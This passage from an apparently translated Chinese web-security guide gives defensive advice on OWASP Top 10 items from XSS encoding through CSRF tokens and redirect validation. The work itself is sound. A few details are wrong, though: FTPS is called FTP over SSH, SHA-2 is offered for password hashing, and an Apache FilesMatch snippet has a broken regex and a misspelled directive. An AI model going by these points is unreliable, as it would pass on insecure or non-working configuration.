2.  当你需要将用户提供的信息放在输出页面上时，校验这些数据来防止任何类型代码的插入。我们已经在 A1 中看到如何实现它。

3.  出于一些原因，如果用户被允许输入特殊字符或者代码段，在它插入到输出之前，过滤或合理编码文本。

4.  对于过滤，在 PHP 中，可以使用`filter_var `。例如，如果你想让字符串为邮件地址：

    ```php
    $email = "john(.doe)@exa//mple.com"; 
    $email = filter_var($email, FILTER_SANITIZE_EMAIL); 
    echo $email;
    ```
    
    对于编码，你可以在 PHP 中使用`htmlspecialchars `：
    
    ```php
    $str = "The JavaScript HTML tags are <script> for opening, and </ script>  for closing."; 
    echo htmlspecialchars($str); 
    ```
    
5.  在 .NET 中，对于 4.5 及更高版本，` System.Web.Security.AntiXss`命名空间提供了必要的工具。对于 .NET 框架 4 及之前的版本，你可以使用 Web 保护库：`http://wpl.codeplex.com/`。

6.  同样，为了防止储存型 XSS，在储存进数据库或从数据库获取之前，编码或过滤每个信息片段。

7.  不要忽略头部、标题、CSS 和页面的脚本区域，因为它们也可以被利用。

### 工作原理

除了合理的输入校验，以及不要将用户输入用作输出信息，过滤和编码也是防止 XSS 的关键层面。

过滤意味着从字符串移除不允许的字符。这在输入字符串中存在特殊字符时很实用。

编码将特殊字符转换为 HTML 代码表示。例如，`&`变为`&amp;`、`<`变为`&lt;`。一些应用允许在输入字符串中使用特殊字符，对它们来说过滤不是个选择。所以应该在将输入插入页面，或者储存进数据库之前编码输入。

### 另见

OWASP 拥有值得阅读的 XSS 预防速查表：

+   https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet 

## A4 避免直接引用不安全对象

当应用允许攻击者（也是校验过的用户）仅仅修改请求中的，直接指向系统对象的参数值，来访问另一个未授权的对象时，就存在不安全对象的直接引用（IDOR）。我们已经在本地文件包含和目录遍历漏洞中看到了一些例子。

根据 OWASP，IDOR 是 Web 应用中第四大关键漏洞。这些漏洞通常由不良的访问控制实现，或者“隐藏式安全”策略（如果用户不能看到它，他们就不能知道它的存在）导致。这些在没有经验的开发者之中是个常见的做法。

这个秘籍中，我们会涉及在设计访问控制机制时应该考虑的关键层面，以便预防 IDOR 漏洞。

### 操作步骤

1.  使用非直接引用优于直接引用。例如，不要通过参数中的名称来引用页面（`URL?page="restricted_page"`），而是要创建索引，并在内部处理它（`URL?page=2`）。

2.  将非直接引用映射到用户（会话）层面，于是用户仅仅能够访问授权的对象，即使它们修改了下标。

3.  在传递相应对象之前校验引用，如果请求的用户没有权限来访问，展示通用错误页面。

4.  输入校验也是很重要的，尤其是目录遍历和文件包含的情况下。

5.  永远不要采取“隐藏式安全”的策略。如果有些文件包含受限的信息，即使它没有引用，有些人也会把它翻出来。

### 工作原理

不安全对象的直接引用在 Web 应用中的表现形式有所不同，从目录遍历到敏感的 PDF 文档的引用。但是它们的大多数都依赖于一个假设，即用户永远不会找到方法来访问不能显式访问的东西。

为了防止这种漏洞，需要在设计和开发期间执行一些积极操作。设计可靠授权机制，来验证尝试访问一些信息的用户的关键是，是否用户真正允许访问它。

将引用对象映射为下标来避免对象名称直接用于参数值（就像 LFI 中的那样）是第一步。攻击者也可以修改下标，这很正常，就像对对象名称所做的那样。但是数据库中存在下标-对象的表的话，添加字段来规定访问所需的权限级别，比起没有任何表并且直接通过名称来访问资源，要容易得多。

之前说过，下标的表可能包含访问对象所需的权限级别，更加严格的话还有拥有者的 ID。所以，它只能够在请求用户是拥有者的情况下访问。

最后，输入校验必须存在于 Web 应用安全的每个层面。

## A5 基本的安全配置指南

系统的默认配置，包括操作系统和 Web 服务器，多数用于演示和强调他们的基本或多数有关特性，并不能保护它们不被攻击。

一些常见的可能使系统沦陷的默认配置，是数据库、Web 服务器或 CMS 安装时创建的默认管理员账户，以及默认管理员页面、默认栈回溯错误信息，以及其它。

这个秘籍中，我们会涉及 OWASP Top 10 中第五大关键漏洞，错误的安全配置。

### 操作步骤

1.  可能的话，删除所有管理员应用，例如 Joomla 的 admin，WordPress 的 admin，PhpMyAdmin，或者 Tomcat Manager。如果不能这样，使它们只能从本地网络访问，例如，在 Apache 服务器中禁止来自外部网络的 PhpMyAdmin 访问，修改`httd.conf`文件（或者相应的站点配置文件）。

    ```
    <Directory /var/www/phpmyadmin>
    
        Order Deny,Allow  
        Deny from all  
        Allow from 127.0.0.1 ::1  
        Allow from localhost  
        Allow from 192.168  
        Satisfy Any
        
    </Directory>
    ```
    
    这会首先禁止所有地址到`phpmyadmin`目录的访问，之后它允许任何来自 locaohost 和以`192.168`开头的地址的请求，这是本地网络的地址。
    
2.  修改所有 CMS、应用、数据库、服务器和框架的所有管理员密码，使其强度足够。一些应用的例子是：

    +   Cpanel 
    +   Joomla 
    +   WordPress 
    +   PhpMyAdmin 
    +   Tomcat manager
    
3.  禁用所有不必要或未使用的服务器和应用特性。从日常或每周来看，新的漏洞都出现在 CMS 的可选模块和插件中。如果你的应用不需要它们，就不要激活它们。

4.  始终执行最新的安全补丁和更新。在生成环境，建立测试环境来预防使站点不工作的缺陷十分重要，因为新版本存在一些兼容性及其它问题。

5.  建立不会泄露跟踪信息、软件版本、程序组件名称，或任何其它调试信息的自定义的错误页面。如果开发者需要跟踪错误记录或者一些一些标识符对于技术支持非常必要，创建带有简单 ID 和错误描述的索引，并只展示 ID 给用户。所以当错误报告给相关人士的时候，它们会检查下标并且知道发生了什么错误。

6.  采取“最小权限原则”。每个用户在每个层面（操作系统、数据库、或应用）上都应该只能够严格访问正确操作所需的信息。

7.  使用上一个要点来考虑账户，构建安全配置的原则，并且将其应用到每个新的实现、更新或发布以及当前系统中。

8.  强制定期的安全测试或审计，来帮助检测错误配置或遗漏的补丁。

### 工作原理

谈论安全和配置问题时，“细节决定成败”十分恰当。web 服务器、数据库服务器、CMS、或者应用配置应该在完全可用和实用、以及保护用户和拥有者之间取得平衡。

Web 应用的一个常见错误配置就是一些 Web 管理站点对整个互联网都可见。这看起来并不是个大问题，但是我们应该知道，管理员登录页面更容易吸引攻击者，因为它可以用于获得高级权限等级，并且任何 CMS、数据或者站点管理工具都存在已知的常用默认密码列表。所以，我们强烈推荐不要把这些管理站点暴露给外部，并且尽可能移除它们。

此外，强密码的使用，以及修改默认密码（即使它们是强密码），在发布应用到公司内部网络，以及互联网的时候需要强制执行。当今，当我们将服务器开放给外部的时候，它收到的第一个流量就是端口扫描，登录页面请求，以及登录尝试，甚至在第一个用户知道该应用之前。

自定义错误页面的使用有助于安全准备，因为 Web 服务器和应用中的默认的错误信息展示太多的信息（从攻击者角度），它们关于错误、所使用的编程语言、栈回溯、所使用的数据库、操作系统以及其它。这些信息不应该暴露，因为它会帮助我们理解应用如何构建，并且提供所使用软件的版本和名称。攻击者通过这些信息就可以搜索已知漏洞，并构造更加有效的攻击过程。

一旦我们的服务器上的部署应用和所有服务都正确配置，我们就可以制订安全原则并且将其应用于所有要配置的新服务器或者已更新的服务器，或者当前带有合理规划的生产服务器。

这个配置原则需要持续测试，以便改进它以及持续保护新发现的漏洞。

## A6 保护敏感数据

当应用储存或使用敏感信息（信用卡号码、社会安全号码、健康记录，以及其它）时，必须采取特殊的手段来保护它们，因为它可能为负责保护它们的组织带来严重的信用、经济或者法律损失，以及被攻破。

OWASP Top 10 的第六名是敏感数据泄露，它发生在应该保护的数据以纯文本泄露，或者带有弱安全措施的时候。

这个秘籍中，我们会涉及一些处理、传递和储存这种数据类型的最佳实践。

### 操作步骤

1.  如果你使用的敏感数据可以在使用之后删除，那么删除它。最好每次使用信用卡的时候询问用户，避免被盗取。

2.  在处理支付的时候，始终使用支付网关，而不是在你的服务器中储存数据。查看：` http://ecommerce-platforms.com/ ecommerce-selling-advice/choose-payment-gateway-ecommerce-store`。

3.  如果我们需要储存敏感数据，我们要采取的第一个保护就是使用强密码算法和相应的强密钥来加密。推荐 Twofish、AES、RSA 和三重 DES。

4.  密码储存在数据库的时候，应该以单项哈希函数的哈希形式存储，例如，bcypt、scrypt 或 SHA-2。

5.  确保所有敏感文档只能被授权用户访问。不要在 Web 服务器的文档根目录储存它们，而是在外部目录储存，并通过程序来访问。如果出于某种原因必须在服务器的文档根目录储存敏感文件，使用`.htaccess `文件来防止直接访问：

    ```
    Order deny,allow 
    Deny from all
    ```
    
6.  禁用包含敏感数据的页面缓存。例如，在 Apache 中我们可以禁用 PDF 和 PNG 的缓存，通过`httpd.conf`中的下列设置：

    ```
    <FilesMatch "\.(pdf|png)> 
    FileETag None 
    Header unset ETag 
    Header set Cache-Control "max-age=0, no-cache, no-store, mustrevalidate" 
    Header set Pragma "no-cache" 
    Header set Expires "Wed, 11 Jan 1984 05:00:00 GMT" 
    </FilesMatch>
    ```
    
7.  如果你允许文件上传，始终使用安全的通信频道来传输敏感数据，也就是带有 TLS 的 HTTPS，或者 FTPS（SSH 上的 FTP）。

### 工作原理

对于保护敏感数据，我们需要最小化数据泄露或交易的风险。这就是正确加密储存敏感数据，以及保护加密密钥是所做的第一件事情的原因。如果可能不需要储存这类数据，这只是个理想选择。

密码应该使用单向哈希算法，在将它们储存到数据之前计算哈希。所以，即使它们被盗取，攻击者也不能立即使用它们，并且如果密码强度足够，哈希也是足够强的算法，它就不会在短时间内被破解。

如果我们在 Apache 服务器的文档根目录（`/var/ www/html/`）储存敏感文档或数据，我们就通过 URL 将这些信息暴露用于下载。所以，最好将它储存到别的地方，并编写特殊的服务端代码来在必要时获取它们，并带有预先的授权检查。

此外，例如 Archive.org、WayBackMachine 或者 Google 缓存页面，可能在缓存含有敏感信息的文件时，以及我们没能在应用的上一个版本有效保护它们时产生安全问题。所以，不允许缓存此类文档非常重要。

## A7 确保功能级别的访问控制

功能级别的访问控制是访问控制的一种，用于防止匿名者或未授权用户的功能调用。根据 OWASP，缺乏这种控制是 Web 应用中第七大严重的安全问题。

这个秘籍中，我们会看到一些推荐来提升我们的应用在功能级别上的访问控制。

### 操作步骤

1.  确保每一步都正确检查了工作流的权限。

2.  禁止所有默认访问，之后在显示的授权校验之后允许访问。

3.  用户、角色和授权应该在灵活的媒介中储存，例如数据库或者配置文件，不要硬编码它们。

4.  同样，“隐藏式安全”不是很好的策略。

### 工作原理

开发者只在工作流的开始检查授权，并假设下面的步骤都已经对用户授权，这是常见的现象。攻击者可能会尝试调用某个功能，它是工作流的中间步骤，并由于控制缺失而能够访问它。

对于权限，默认禁止所有用户是个最佳实践。如果我们不知道一些用户是否有权访问一些功能，那么它们就不应该执行。将你的权限表转化为授权表。如果某些用户在某些功能上没有显式的授权，则禁止它们的访问。

在为你的应用功能构建或实现访问控制机制的时候，将所有授权储存在数据库中，或者在配置文件中（数据库是最好的选项）。如果用户角色和权限被硬编码，它们就会难以维护、修改或更新。

## A8 防止 CSRF

当 Web 应用没有使用会话层面或者操作层面的标识，或者标识没有正确实现的时候，它们就可能存在跨站请求伪造漏洞，并且攻击者可以强迫授权用户执行非预期的操作。

CSRF 是当今 Web 应用的第八大严重漏洞，根据 OWASP， 并且我们在这个秘籍中会看到如何在应用中防止它。

### 操作步骤

1.  第一步也是最实际的 CSRF 解决方案就是实现唯一、操作层面的标识。所以每次用户尝试执行某个操作的时候，会生成新的标识并在服务端校验。

2.  唯一标识应该不能被轻易由攻击者猜测，所以它们不能将其包含在 CSRF 页面中。随机生成是个好的选择。

3.  在每个可能为 CSRF 目标的表单中包含要发送的标识。“添加到购物车”请求、密码修改表单、邮件、联系方式或收货信息管理，以及银行的转账页面都是很好的例子。

4.  标识应该在每次请求中发送给服务器。这可以在 URL 中实现，或者任何其它变量或者隐藏字段，都是推荐的。

5.  验证码的使用也可以防止 CSRF。

6.  同样，在一些关键操作中询问重新授权也是个最佳实践，例如，银行应用中的转账操作。

### 工作原理

防止 CSRF 完全是确保验证过的用户是请求操作的人。由于浏览器和 Web 应用的工作方式，最佳实践是使用标识来验证操作，或者可能的情况下使用验证码来控制。

由于攻击者打算尝试破解标识的生成，或者验证系统，以一种攻击者不能猜测的方式，安全地生成它们非常重要。而且要使它们对每个用户和每个操作都唯一，因为复用它们会偏离它们的目的。

验证码控制和重新授权有时候会非常麻烦，使用户反感。但是如果操作的重要性值得这么做，用户可能愿意接受它们来换取额外的安全级别。

### 另见

有一些编程库有助于实现 CSRF 防护，节省开发者的大量工作。例子之一就是 OWASP 的 CSRF Guard：`https://www.owasp.org/index.php/CSRFGuard`。

## A9 在哪里寻找三方组件的已知漏洞

现在的 Wbe 应用不再是单个开发者，也不是单个开发团队的作品。开发功能性、用户友好、外观吸引人的 Web 应用涉及到三方组件的使用，例如编程库，外部服务的 API（Fackbook、Google、Twitter），开发框架，以及许多其它的组件，其中编程、测试和打补丁的工作量很少，甚至没有。

有时候这些三方组件被发现存在漏洞，并且它们将这些漏洞转移到了我们的应用中。许多带有漏洞组件的应用很长时间都没有打补丁，使整个组织的安全体系中出现缺陷。这就是 OWASP 将使用带有已知漏洞的三方组件划分为 Web 应用安全的第九大威胁的原因。

这个秘籍中，我们会了解，如果一些我们所使用的组件拥有已知漏洞，应该到哪里寻找，以及我们会查看一些这种漏洞组件的例子。

### 操作步骤

1.  第一个建议是，优先选择受支持和广泛使用的知名软件。

2.  为你的应用所使用的三方组件保持安全更新和补丁的更新。

3.  用于搜索一些特定组件的漏洞的好地方就是厂商的网站：它们通常拥有“发布说明”部分，其中它们会公布它们纠正了哪个 bug 或漏洞。这里我们可以寻找我们所使用的（或更新的）版本，并且插件是否有有已知的问题没有打补丁。

4.  同样，厂商通常拥有安全建议站点，例如 Microsoft：`https://technet.microsoft.com/library/security/`，Joomla：` https:// developer.joomla.org/security-centre.html`，和 Oracle：` http://www. oracle.com/technetwork/topics/security/alerts-086861.html`。我们可以使用它们来保持我们用于应用的软件的更新。

5.  也有一些厂商无关的站点，它们致力于通知我们漏洞和安全问题。有个非常好的网站，集中了多个来源的信息，是 CVE Details（`http://www.cvedetails.com/`）。这里我们可以搜索多数厂商或产品，或者列出所有已知漏洞（至少是拥有 CVE 号码的漏洞），并且按照年份、版本和 CVSS 分数排列。

6.  同时，黑客发布利用和发现的站点也是个获得漏洞和我们所使用的软件的信息的好地方。最流行的是 Exploit DB（`https://www.exploit-db.com/`）。 Full disclosure 邮件列表（`http://seclists.org/fulldisclosure/`），以及 Packet Storm 的文件部分（`https://packetstormsecurity.com/files/`）。

7.  一旦我们发现了我们软件组件中的漏洞，我们必须评估它是否对我们的应用必要，或者需要移除。如果不能这样，我们需要尽快打补丁。如果没有可用的补丁或变通方案，并且漏洞是高危的，我们必须开始寻找组件的替代。

### 工作原理

考虑在我们的应用中使用三方软件组件之前，我们需要查看它的安全信息，并了解，我们所使用的组件是否有更稳定更安全的版本或替代。

一旦我们选择了某个，并且将其包含到我们的应用中，我们需要使其保持更新。有时它可能涉及到版本改动以及没有后向兼容，但是这是我们想要维持安全的代价。如果我们不能更新或为高危漏洞打补丁，我们还可以使用 WAF（Web 应用防火墙）和 IPS（入侵检测系统）来防止攻击。

除了在执行渗透测试的时候比较实用，下载和漏洞发布站点可以被系统管理员利用，用于了解可能出现什么攻击，它们的原理，以及如何保护应用避免它们。

## A10 重定向验证

根据 OWASP，未验证的重定向和转发是 Web 应用的第十大严重安全问题。它发生在应用接受 URL 或内部页面作为参数来执行重定向或转发操作的时候。如果参数没有正确验证，攻击者就能够滥用它来使其重定向到恶意网站。

这个秘籍中，我们会了解如何验证我们接受的用于重定向或转发的参数，我们需要在开发应用的时候实现它。

### 操作步骤

1.  不希望存在漏洞吗？那就不要使用它。无论怎样，都不要使用重定向和转发。

2.  如果需要使用重定向，尝试不要使用用户提供的参数（请求变量）来计算出目标。

3.  如果需要使用参数，实现一个表，将其作为重定向的目录，使用 ID 代替 URL 作为用户应该提供的参数。

4.  始终验证重定向和转发操作涉及到的输入。使用正则表达式或者白名单来检查提供的值是否有效。

### 工作原理

重定向和转发是钓鱼者和其它社会工程师最喜欢用的工具，并且有时候我们对目标没有任何安全控制。所以，即使它不是我们的应用，它的安全问题也会影响我们的信誉。这就是最好不要使用它们的原因。

如果这种重定向的目标是已知站点，例如 Fackbook 或 Google，我们就可以在配置文件或数据表中建立目标目录，并且不需要使用客户端提供的参数来实现。

如果我们构建包含所有允许的重定向和转发 URL 的数据表，每个都带有 ID，我们可以将 ID 用于参数，而不是目标本身。这是一种白名单的形式，可以防止无效目标的插入。

最后同样是校验。我们始终要校验每个来自客户端的输入，这非常重要，因为我们不知道用户要输入什么。如果我们校验了重定向目标的正确性，除了恶意转发或重定向之外，我们还可以防止可能的 SQL 注入、XSS 或者目录遍历。所以，它们都是相关的。
